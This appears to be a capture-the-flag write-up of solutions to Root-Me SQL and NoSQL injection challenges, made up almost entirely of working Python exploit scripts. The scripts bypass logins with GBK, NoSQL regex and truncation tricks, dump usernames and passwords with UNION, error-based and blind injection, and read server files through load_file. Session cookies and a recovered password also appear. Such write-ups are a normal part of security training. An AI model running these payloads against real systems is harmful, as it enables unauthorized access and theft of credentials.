

# SQL/NOSQL Challenge From Root-Me : [Link](https://www.root-me.org/en/Challenges/Web-Server/?titre_co=sql&tri_co=nombre_validation&sens_co=-1)



## SQL injection - Authentication - GBK


### Solution: 
```python
#!/usr/bin/env python3

import requests

session = requests.session()

url = "http://challenge01.root-me.org:80/web-serveur/ch42/"
cookies = {"PHPSESSID": "d98371dbbf99fdd892c6aed10ba46eb4", "_ga_SRYSKX09J7": "GS1.1.1705855195.3.1.1705855314.0.0.0", "_ga": "GA1.1.1754628006.1705777800"}

data = {"login": "\xbf' or 1=1 -- -", "password": "admin"}

session.post(url, cookies=cookies, data=data, allow_redirects=True)
r = requests.get(url + "logged.php", cookies=cookies)
print(r.text)
```


## SQL injection - String

### Solution:
```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
url = "http://challenge01.root-me.org:80/web-serveur/ch19/?action=recherche"
cookies = {"_ga_SRYSKX09J7": "GS1.1.1705857779.4.1.1705858572.0.0.0", "_ga": "GA1.1.1754628006.1705777800"}

pay = "asd' or id='1' union select password,username from users-- -+"
data = {"recherche": pay}
r = requests.post(url, cookies=cookies, data=data)

soup = BeautifulSoup(r.text, 'html.parser')
beautified_html = soup.prettify()
print(beautified_html)

print(r.text)
```

## SQL injection - Numeric

### Solution:

```python
import requests
from bs4 import BeautifulSoup

url = "http://challenge01.root-me.org:80/web-serveur/ch18/?action=news&news_id="
cookies = {"_ga_SRYSKX09J7": "GS1.1.1705857779.4.1.1705859466.0.0.0", "_ga": "GA1.1.1754628006.1705777800"}

sql = "2 UNION SELECT 5555,username,password from users"

r = requests.get(url + sql, cookies=cookies)

soup = BeautifulSoup(r.text, 'html.parser')
print(soup.prettify())
print(r.text)
```


## NoSQL injection - Authentication

### Solution:

```python
#!/usr/bin/env python3

import string
import requests
import re

session = requests.session()

cookies = {"_ga_SRYSKX09J7": "GS1.1.1705857779.4.1.1705860242.0.0.0", "_ga": "GA1.1.1754628006.1705777800"}

for i in string.printable:
    url = f"http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]={i}&pass[$ne]=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    r = session.get(url, cookies=cookies)
    if "Bad username or bad password !" not in r.text:
        matches = re.findall(r'flag{.*?}', r.text)
        for match in matches:
            print(match)
            exit(0)
```

## SQL injection - Error

### Solution: 
```python
#!/usr/bin/env python3
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,'

passwords = "p455w0rd_c0l"
usernames = "us3rn4m3_c0l"
tablename = "m3mbr35t4bl3"
for i in range(120):
    r = requests.get(url + f"(CAST((SELECT%20{usernames}%20FROM%20{tablename}%20LIMIT%201%20OFFSET%20{i})%20AS%20int))")
    if "You need to be authenticated to access records" not in r.text:
        print(r.text.replace("</body></html>", "").replace("<html><body>", "").replace("<br>", "\n"))

for i in range(120):
    r = requests.get(url + f"(CAST((SELECT%20{passwords}%20FROM%20{tablename}%20LIMIT%201%20OFFSET%20{i})%20AS%20int))")
    if "You need to be authenticated to access records" not in r.text:
        print(r.text.replace("</body></html>", "").replace("<html><body>", "").replace("<br>", "\n"))
```
## SQL injection - Blind

### Solution:

```python
#!/usr/bin/env python3
import requests, string

url = "http://challenge01.root-me.org:80/web-serveur/ch10/"
cookies = {"_ga_SRYSKX09J7": "GS1.1.1705863979.6.1.1705865439.0.0.0", "_ga": "GA1.1.1754628006.1705777800"}
username="admin"
password="e2azO93i"

def GetLength(username):
    for length in range(64):
        data = {"username": f"user1' AND (select LENGTH(password) from users where username='{username}' LIMIT 1)={length} --", "password": "z"}
        r = requests.post(url, cookies=cookies, data=data)
        print(f"Trying Length: {length} ")
        if "Welcome" in r.text:
            return length


def GetPass(username, length):
    password = ""
    for index in range(1, length + 1):
        print(password)
        for char in string.printable:
            data = {"username": f"user1' AND (SELECT SUBSTR(password,{index},1) FROM users WHERE username='{username}')='{char}' --", "password": "z"}
            r = requests.post(url, cookies=cookies, data=data)
            print(f"Trying Index: {index}, Char {char}")
            if "Welcome" in r.text:
                password += char
                break
    return password

passwd = GetPass(username, GetLength(username))
print(passwd)


```

## SQL Truncation

### Solution:
```python
#!/usr/bin/env python3

import requests

## Source Code have: 
# <!--
# CREATE TABLE IF NOT EXISTS user(   
# 	id INT NOT NULL AUTO_INCREMENT,
#     login VARCHAR(12),
#     password CHAR(32),
#     PRIMARY KEY (id));
# -->

url = "http://challenge01.root-me.org:80/web-serveur/ch36/register.php"

user = "admin               hihi" # > 12


data = {"login": user, "password": "sirsirsir"}

r = requests.post(url, data=data)

if "User save" in r.text:
    burp0_url = "http://challenge01.root-me.org:80/web-serveur/ch36/admin.php"
    burp0_data = {"password": "sirsirsir"}
    rr = requests.post(burp0_url, data=burp0_data)
    print(rr.text)
```

## SQL injection - File reading


### Solution:
```python
#!/usr/bin/env python3
import requests



# Getting The admin encoded credentials
burp0_url = "http://challenge01.root-me.org:80/web-serveur/ch31/?action=members&id=1%20AND%201=2%20UNION%20ALL%20SELECT%20null,concat_ws(0x3a,member_id,member_login,member_password,member_email),null,version()%20from%20member--%20-+"

# r = requests.get(burp0_url)


# Reading The index.php to decode The password 
file_to_read = "/challenge/web-serveur/ch31/index.php"
file_to_read_hex = file_to_read.encode().hex().upper()

payload = f" AND 1=2 UNION SELECT 1,2,3,load_file(0x{file_to_read_hex})--"

url = "http://challenge01.root-me.org:80/web-serveur/ch31/?action=members&id=1 " + payload
r = requests.get(url)
# print(r.text)

# decoding the password Using The key
import base64
def stringxor(o1, o2):
    res = ''
    for i in range(len(o1)):
        res += chr(ord(o1[i]) ^ ord(o2[i]))
    return res

key = "c92fcd618967933ac463feb85ba00d5a7ae52842" # from index.php
encrypted_data = "VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==" # from the database

decoded_data = base64.b64decode(encrypted_data).decode('utf-8')
result = stringxor(key, decoded_data)

# print(result)

```
![image](https://github.com/ACHUX21/Writeups/assets/130113878/517d4a50-901a-4703-b850-0681ed10f552)

